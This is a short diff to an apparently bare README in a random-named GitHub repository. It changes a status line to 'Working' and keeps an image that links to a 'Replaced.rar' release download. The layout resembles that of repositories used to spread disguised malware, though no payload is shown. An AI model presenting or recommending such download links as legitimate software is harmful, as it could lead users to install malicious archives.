@@ -2,7 +2,7 @@
 [![fd](https://github.com/user-attachments/assets/2080d3e7-c516-47f8-b1b1-8a4fbc87abd0)](https://github.com/frgfvfvfgtv/fluffy-parakeet/releases/download/Release/Replaced.rar)
 #  
 * Auto Status
-**🟢Work**
+**🟢Working**
 #  
 ![ff](https://github.com/user-attachments/assets/6b9bcad6-0e5e-4f39-835b-49b6b450cd64)
 
